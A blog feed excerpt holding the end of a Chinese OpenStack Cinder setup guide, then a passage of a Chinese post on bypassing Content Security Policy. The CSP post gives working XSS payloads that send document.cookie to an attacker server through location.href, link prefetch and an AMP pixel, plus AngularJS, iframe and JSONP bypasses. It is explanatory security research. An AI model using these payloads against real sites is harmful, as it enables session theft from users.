id="十二、块存储服务（可以新开一台机器也可以使用计算节点，我这里使用的计算节点node1）"><a href="#十二、块存储服务（可以新开一台机器也可以使用计算节点，我这里使用的计算节点node1）" class="headerlink" title="十二、块存储服务（可以新开一台机器也可以使用计算节点，我这里使用的计算节点node1）"></a><strong>十二、块存储服务（可以新开一台机器也可以使用计算节点，我这里使用的计算节点node1）</strong></h2><p>首先添加一块硬盘50G吧。使用LVM的方式</p><h3 id="12-1-安装lvm"><a href="#12-1-安装lvm" class="headerlink" title="12.1 安装lvm"></a><strong>12.1 安装lvm</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># yum install lvm2</span><br><span class="line"># systemctl enable lvm2-lvmetad.service</span><br><span class="line"># systemctl start lvm2-lvmetad.service</span><br></pre></td></tr></table></figure><h3 id="12-2配置lvm"><a href="#12-2配置lvm" class="headerlink" title="12.2配置lvm"></a><strong>12.2配置lvm</strong></h3><p>创建LVM物理卷/dev/sdb</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># pvcreate /dev/sdb</span><br><span class="line"></span><br><span class="line">Physical volume <span class="string">"/dev/sdb"</span> successfully created</span><br></pre></td></tr></table></figure><p>创建LVM卷组cinder-volumes：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># vgcreate cinder-volumes /dev/sdb</span><br><span class="line"></span><br><span class="line">Volume group <span class="string">"cinder-volumes"</span> successfully created</span><br></pre></td></tr></table></figure><p>编辑 /etc/lvm/lvm.conf</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">devices &#123;</span><br><span class="line">...</span><br><span class="line">filter = [ <span class="string">"a/sdb/"</span>, <span class="string">"r/.*/"</span>]</span><br></pre></td></tr></table></figure><p>#################################其他方式</p><p>如果您的存储节点在操作系统磁盘上使用LVM，则还必须将关联的设备添加到过滤器。例如，如果/dev/sda设备包含操作系统：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter  =  [“a / sda /”，“a / sdb /”，“r /.*<span class="regexp">/”]</span></span><br></pre></td></tr></table></figure><p>同样，如果计算节点在操作系统磁盘上使用LVM，则还必须修改/etc/lvm/lvm.conf这些节点上的文件中的筛选器， 使其只包含操作系统磁盘。例如，如果/dev/sda 设备包含操作系统：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filter  =  [“a / sda /”，“r /.*<span class="regexp">/”]</span></span><br></pre></td></tr></table></figure><h3 id="12-3-安装和配置的部件"><a href="#12-3-安装和配置的部件" class="headerlink" title="12.3**安装和配置的部件**"></a><strong>12.3**</strong>安装和配置的部件**</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install openstack-cinder targetcli python-keystone</span><br></pre></td></tr></table></figure><h3 id="12-4配置主配置文件（-etc-cinder-cinder-conf-）"><a href="#12-4配置主配置文件（-etc-cinder-cinder-conf-）" class="headerlink" title="12.4配置主配置文件（**/etc/cinder/cinder.conf**）"></a><strong>12.4配置主配置文件（**</strong>/etc/cinder/cinder.conf<strong>**）</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line"># ...</span><br><span class="line">transport_url = rabbit:<span class="comment">//openstack:openstack@linux-node2</span></span><br><span class="line">auth_strategy = keystone</span><br><span class="line">my_ip = <span class="number">192.168</span><span class="number">.57</span><span class="number">.142</span></span><br><span class="line">enabled_backends = lvm</span><br><span class="line">glance_api_servers = http:<span class="comment">//linux-node2:9292</span></span><br><span class="line">[database]</span><br><span class="line"># ...</span><br><span class="line">connection = mysql:<span class="comment">//cinder:cinder@linux-node2/cinder</span></span><br><span class="line">[keystone_authtoken]</span><br><span class="line"># ...</span><br><span class="line">auth_uri = http:<span class="comment">//linux-node2:5000</span></span><br><span class="line">auth_url = http:<span class="comment">//linux-node2:35357</span></span><br><span class="line">memcached_servers = linux-node2:<span class="number">11211</span></span><br><span class="line">auth_type = password</span><br><span class="line">project_domain_name = <span class="keyword">default</span></span><br><span class="line">user_domain_name = <span class="keyword">default</span></span><br><span class="line">project_name = service</span><br><span class="line">username = cinder</span><br><span class="line">password = cinder</span><br><span class="line">########【lvm】在最后面添加###############</span><br><span class="line">[lvm]</span><br><span class="line">volume_driver = cinder.volume.drivers.lvm.LVMVolumeDriver</span><br><span class="line">volume_group = cinder-volumes</span><br><span class="line">iscsi_protocol = iscsi</span><br><span class="line">iscsi_helper = lioadm</span><br><span class="line">[oslo_concurrency]</span><br><span class="line"># ...</span><br><span class="line">lock_path = <span class="regexp">/var/</span>lib/cinder/tmp</span><br></pre></td></tr></table></figure><h3 id="12-5-启动"><a href="#12-5-启动" class="headerlink" title="12.5 启动"></a><strong>12.5 启动</strong></h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># systemctl enable openstack-cinder-volume.service target.service</span><br><span class="line"># systemctl start openstack-cinder-volume.service target.service</span><br></pre></td></tr></table></figure><p>12.6 检查</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 cinder]# admin-openrc</span><br><span class="line">[root@linux-node2 cinder]# openstack volume service list</span><br><span class="line">+------------------+-----------------+------+---------+-------+----------------------------+</span><br><span class="line">| Binary           | Host            | Zone | Status  | State | Updated At                 |</span><br><span class="line">+------------------+-----------------+------+---------+-------+----------------------------+</span><br><span class="line">| cinder-scheduler | linux-node2     | nova | enabled | up    | <span class="number">2018</span><span class="number">-01</span><span class="number">-02</span>T16:<span class="number">11</span>:<span class="number">10.000000</span> |</span><br><span class="line">| cinder-volume    | linux-node1@lvm | nova | enabled | up    | <span class="number">2018</span><span class="number">-01</span><span class="number">-02</span>T16:<span class="number">11</span>:<span class="number">05.000000</span> |</span><br><span class="line">+------------------+-----------------+------+---------+-------+----------------------------+</span><br></pre></td></tr></table></figure><h3 id="12-7-创建块存储"><a href="#12-7-创建块存储" class="headerlink" title="12.7 创建块存储"></a><strong>12.7 创建块存储</strong></h3><p>创建一个10G的存储</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 cinder]# openstack volume create --size 10 volume1</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| Field               | Value                                |</span><br><span class="line">+---------------------+--------------------------------------+</span><br><span class="line">| attachments         | []                                   |</span><br><span class="line">| availability_zone   | nova                                 |</span><br><span class="line">| bootable            | <span class="literal">false</span>                                |</span><br><span class="line">| consistencygroup_id | None                                 |</span><br><span class="line">| created_at          | <span class="number">2018</span><span class="number">-01</span><span class="number">-02</span>T15:<span class="number">46</span>:<span class="number">13.269273</span>           |</span><br><span class="line">| description         | None                                 |</span><br><span class="line">| encrypted           | False                                |</span><br><span class="line">| id                  | d1b2e03b-c80a<span class="number">-4</span>cde-ad25<span class="number">-65</span>abab621b0c |</span><br><span class="line">| migration_status    | None                                 |</span><br><span class="line">| multiattach         | False                                |</span><br><span class="line">| name                | volume1                              |</span><br><span class="line">| properties          |                                      |</span><br><span class="line">| replication_status  | None                                 |</span><br><span class="line">| size                | <span class="number">10</span>                                   |</span><br><span class="line">| snapshot_id         | None                                 |</span><br><span class="line">| source_volid        | None                                 |</span><br><span class="line">| status              | creating                             |</span><br><span class="line">| type                | None                                 |</span><br><span class="line">| updated_at          | None                                 |</span><br><span class="line">| user_id             | <span class="number">40</span>a299a16064488facc16764cb635c12     |</span><br><span class="line">+---------------------+--------------------------------------+</span><br></pre></td></tr></table></figure><p><strong>查看</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 cinder]# openstack volume list</span><br><span class="line">+--------------------------------------+---------+-----------+------+-------------+</span><br><span class="line">| ID                                   | Name    | Status    | Size | Attached to |</span><br><span class="line">+--------------------------------------+---------+-----------+------+-------------+</span><br><span class="line">| d1b2e03b-c80a<span class="number">-4</span>cde-ad25<span class="number">-65</span>abab621b0c | volume1 | available |   <span class="number">10</span> |             |</span><br><span class="line">+--------------------------------------+---------+-----------+------+-------------+</span><br></pre></td></tr></table></figure><h3 id="12-7-将卷附加到实例"><a href="#12-7-将卷附加到实例" class="headerlink" title="12.7**将卷附加到实例**"></a><strong>12.7**</strong>将卷附加到实例**</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 cinder]# openstack server add volume provider-instance volume1</span><br></pre></td></tr></table></figure><p>查看</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@linux-node2 cinder]# openstack volume list</span><br><span class="line">+--------------------------------------+---------+--------+------+--------------------------------------------+</span><br><span class="line">| ID                                   | Name    | Status | Size | Attached to                                |</span><br><span class="line">+--------------------------------------+---------+--------+------+--------------------------------------------+</span><br><span class="line">| d1b2e03b-c80a<span class="number">-4</span>cde-ad25<span class="number">-65</span>abab621b0c | volume1 | <span class="keyword">in</span>-use |   <span class="number">10</span> | Attached to provider-instance on /dev/vdb  |</span><br><span class="line">+--------------------------------------+---------+--------+------+--------------------------------------------+</span><br><span class="line">[root@linux-node2 cinder]#</span><br></pre></td></tr></table></figure><h2 id="十三、安装虚拟机"><a href="#十三、安装虚拟机" class="headerlink" title="十三、安装虚拟机"></a><strong>十三、安装虚拟机</strong></h2><p>这里我是自己上传了一个Centos7 的镜像。像上面创建实例一样创建的。后面把硬盘添加到这个实例里面。后面启动。就有了下面的画面</p><p><img src="http://yun.name168.cn/OpenStack004.png" alt="&quot;OpenStack&quot;"></p><p><img src="http://yun.name168.cn/OpenStack005.png" alt="&quot;OpenStack&quot;"></p><p>已经显示有10G硬盘了。现在可以安装系统了。我笔记本配置比较渣渣。弄起来太慢了</p><p><img src="http://yun.name168.cn/OpenStack006.png" alt="&quot;OpenStack&quot;"></p><p>用VNC连接node1 的KVM就可以操作了。网页不好操作</p><p><img src="http://yun.name168.cn/OpenStack007.png" alt="&quot;OpenStack&quot;"></p><p>Node1 中有一个5901的进程。我们用VNC的客户端连接一下就够了</p><p><img src="http://yun.name168.cn/OpenStack008.png" alt="&quot;OpenStack&quot;"></p><p><img src="http://yun.name168.cn/OpenStack009.png" alt="&quot;OpenStack&quot;"></p><p>只要等它安装完就够了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;一、openstack 介绍&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;OpenStack是一个由NASA（美国国家航空航天局）和Rackspace合作研发并发起的，以Apache许可证授权的自由软件和开放源代码项目。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OpenStack是一个开源的云计算管理平台项目，由几个主要的组件组合起来完成具体工作。OpenStack支持几乎所有类型的云环境，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;项目目标是提供实施简单、可大规模扩展、丰富、标准统一的云计算管理平台。OpenStack通过各种互补的服务提供了基础设施即服务（IaaS）的解决方案，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;每个服务提供API以进行集成。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OpenStack是一个旨在为公共及私有云的建设与管理提供软件的开源项目。它的社区拥有超过&lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;家企业及&lt;span class=&quot;number&quot;&gt;1350&lt;/span&gt;位开发者，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;这些机构与个人都将OpenStack作为基础设施即服务（IaaS）资源的通用前端。OpenStack项目的首要任务是简化云的部署过程并为其带来良好的可扩展性。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;本文希望通过提供必要的指导信息，帮助大家利用OpenStack前端来设置及管理自己的公共云或私有云。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OpenStack云计算平台，帮助服务商和企业内部实现类似于 Amazon EC2 和 S3 的云基础架构服务(Infrastructure &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; a Service, IaaS)。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;OpenStack 包含两个主要模块：Nova 和 Swift，前者是 NASA 开发的虚拟服务器部署和业务计算模块；后者是 Rackspace开发的分布式云存储模块，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;两者可以一起用，也可以分开单独用。OpenStack除了有 Rackspace 和 NASA 的大力支持外，还有包括 Dell、Citrix、 Cisco、 Canonical等重量级公司的贡献和支持，&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;发展速度非常快，有取代另一个业界领先开源云平台 Eucalyptus 的态势。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>我的CSP绕过思路及总结</title>
    <link href="https://www.5658.pw/2019/05/11/%E6%88%91%E7%9A%84CSP%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%80%BB%E7%BB%93/"/>
    <id>https://www.5658.pw/2019/05/11/我的CSP绕过思路及总结/</id>
    <published>2019-05-11T00:38:05.000Z</published>
    <updated>2019-05-11T04:53:29.889Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="CSP简介"><a href="#CSP简介" class="headerlink" title="CSP简介"></a>CSP简介</h2><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。<br>当代网站太容易收到XSS的攻击，CSP就是一个统一有效的防止网站收到XSS攻击的防御方法。CSP是一种白名单策略，当有从非白名单允许的JS脚本出现在页面中，浏览器会阻止脚本的执行。<br>CSP的具体介绍可以看看手册<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP" target="_blank" rel="noopener">内容安全策略</a></p><a id="more"></a><h2 id="CSP的绕过"><a href="#CSP的绕过" class="headerlink" title="CSP的绕过"></a>CSP的绕过</h2><p>CSP的绕过从CSP的诞生开始就一直被前端的安全研究人员所热衷，本文总结一些我了解到的CSP的绕过方式，若有不足，敬请批评补充</p><h3 id="location-href"><a href="#location-href" class="headerlink" title="location.href"></a>location.href</h3><p>CSP不影响location.href跳转，因为当今大部分网站的跳转功能都是由前端实现的，CSP如果限制跳转会影响很多的网站功能。所以，用跳转来绕过CSP获取数据是一个万能的办法，虽然比较容易被发现，但是在大部分情况下对于我们已经够用<br>当我们已经能够执行JS脚本的时候，但是由于CSP的设置，我们的cookie无法带外传输，就可以采用此方法，将cookie打到我们的vps上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href = &quot;vps_ip:xxxx?&quot;+document.cookie</span><br></pre></td></tr></table></figure><p>有人跟我说可以跳过去再跳回来，但是这样不是会死循环一直跳来跳去吗2333333<br>利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li></ol><h3 id="link标签导致的绕过"><a href="#link标签导致的绕过" class="headerlink" title="link标签导致的绕过"></a>link标签导致的绕过</h3><p>这个方法其实比较老，去年我在我机器上试的时候还行，现在就不行了<br>因为这个标签当时还没有被CSP约束，当然现在浏览器大部分都约束了此标签，但是老浏览器应该还是可行的。<br>所以我们可以通过此标签将数据带外</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- firefox --&gt;</span><br><span class="line">&lt;link rel=&quot;dns-prefetch&quot; href=&quot;//$&#123;cookie&#125;.vps_ip&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- chrome --&gt;</span><br><span class="line">&lt;link rel=&quot;prefetch&quot; href=&quot;//vps_ip?$&#123;cookie&#125;&quot;&gt;</span><br></pre></td></tr></table></figure><p>当然这个是我们写死的标签，如何把数据带外？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var link = document.createElement(&quot;link&quot;);</span><br><span class="line">link.setAttribute(&quot;rel&quot;, &quot;prefetch&quot;);</span><br><span class="line">link.setAttribute(&quot;href&quot;, &quot;//vps_ip/?&quot; + document.cookie);</span><br><span class="line">document.head.appendChild(link);</span><br></pre></td></tr></table></figure><p>这样就可以把cookie带外了<br>利用条件:</p><ol><li>可以执行任意JS脚本，但是由于CSP无法数据带外</li></ol><h3 id="使用Iframe绕过"><a href="#使用Iframe绕过" class="headerlink" title="使用Iframe绕过"></a>使用Iframe绕过</h3><p>当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效<br>A页面:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- A页面 --&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;self&apos;&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;h1 id=&quot;flag&quot;&gt;flag&#123;0xffff&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>B页面:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- B页面 --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- 下面模拟XSS --&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var iframe = document.createElement(&apos;iframe&apos;);</span><br><span class="line">iframe.src=&quot;A页面&quot;;</span><br><span class="line">document.body.appendChild(iframe);</span><br><span class="line">setTimeout(()=&gt;alert(iframe.contentWindow.document.getElementById(&apos;flag&apos;).innerHTML),1000);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094532-76c02656-738e-1.png" alt="&quot;我的CSP绕过思路及总结&quot;"></p><p>setTimeout是为了等待iframe加载完成<br>利用条件:</p><ol><li>一个同源站点内存在两个页面，一个页面存在CSP保护，另一个页面没有CSP保护且存在XSS漏洞</li><li>我们需要的数据在存在CSP保护的页面</li></ol><h3 id="用CDN来绕过"><a href="#用CDN来绕过" class="headerlink" title="用CDN来绕过"></a>用CDN来绕过</h3><p>一般来说，前端会用到许多的前端框架和库，部分企业为了减轻服务器压力或者其他原因，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险<br>这里给出orange师傅绕hackmd CSP的文章<a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">Hackmd XSS</a><br>案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://cdnjs.cloudflare.com;&quot;&gt;</span><br><span class="line">&lt;!-- foo=&quot;--&gt;</span><br><span class="line">&lt;script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js&gt;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;div ng-app&gt;</span><br><span class="line">    &#123;&#123;constructor.constructor(&apos;alert(document.cookie)&apos;)()&#125;&#125;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>这个是存在低版本angular js的cdn服务商列表<br><a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76</a><br>除了低版本angular js的模板注入，还有许多库可以绕过CSP<br>下面引用<a href="https://www.jianshu.com/p/f1de775bc43e" target="_blank" rel="noopener">https://www.jianshu.com/p/f1de775bc43e</a><br>如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”，可以用此exp</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div data-role=popup id=&apos;&lt;script&gt;alert(1)&lt;/script&gt;&apos;&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>还比如RCTF2018题目出现的AMP库,下面的标签可以获取名字为FLAG的cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;amp-pixel src=&quot;http://your domain/?cid=CLIENT_ID(FLAG)&quot;&gt;&lt;/amp-pixel&gt;</span><br></pre></td></tr></table></figure><p>blackhat2017有篇ppt总结了可以被用来绕过CSP的一些JS库<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a><br>利用条件:</p><ol><li>CDN服务商存在某些低版本的js库</li><li>此CDN服务商在CSP白名单中</li></ol><h3 id="站点可控静态资源绕过"><a href="#站点可控静态资源绕过" class="headerlink" title="站点可控静态资源绕过"></a>站点可控静态资源绕过</h3><p>给一个绕过codimd的(实例)<a href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md" target="_blank" rel="noopener">codimd xss</a><br>案例中codimd的CSP中使用了<code>www.google-analytics.com</code><br>而<a href="http://www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP" target="_blank" rel="noopener">www.google.analytics.com中提供了自定义javascript的功能（google会封装自定义的js，所以还需要unsafe-eval），于是可以绕过CSP</a><br><img src="http://yun.name168.cn/20190511094532-76da0170-738e-1.png" alt="&quot;站点可控静态资源绕过&quot;"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &apos;self&apos;; script-src &apos;unsafe-eval&apos; https://www.google-analytics.com&quot;&gt;</span><br><span class="line">&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="http://yun.name168.cn/20190511094532-76e2f1a4-738e-1.png" alt="&quot;站点可控静态资源绕过&quot;"></p><p>同理，若其他站点下提供了可控静态资源的功能，且CSP中允许了此站点，则可以采用此方式绕过<br>利用条件:</p><ol><li>站点存在可控静态资源</li><li>站点在CSP白名单中</li></ol><h3 id="站点可控JSONP绕过"><a href="#站点可控JSONP绕过" class="headerlink" title="站点可控JSONP绕过"></a>站点可控JSONP绕过</h3><p>JSONP的详细介绍可以看看我之前的一篇文章<a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">https://xz.aliyun.com/t/4470</a><br>大部分站点的jsonp是完全可控的，只不过有些站点会让jsonp不返回html类型防止直接的反射型XSS，但是如果将url插入到script标签中，除非设置x-content-type-options头，否者尽管返回类型不一致，浏览器依旧会当成js进行解析<br>以ins’hack 2019/的bypasses-everywhere这道题为例，题目中的csp设置了<a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src www.google.com; img-src *; default-src &apos;none&apos;; style-src &apos;unsafe-inline&apos;</span><br></pre></td></tr></table></figure><p>看上去非常天衣无缝，但是google站点存在了用户可控jsonp</p><figure class="highlight plain"><table><tr><td 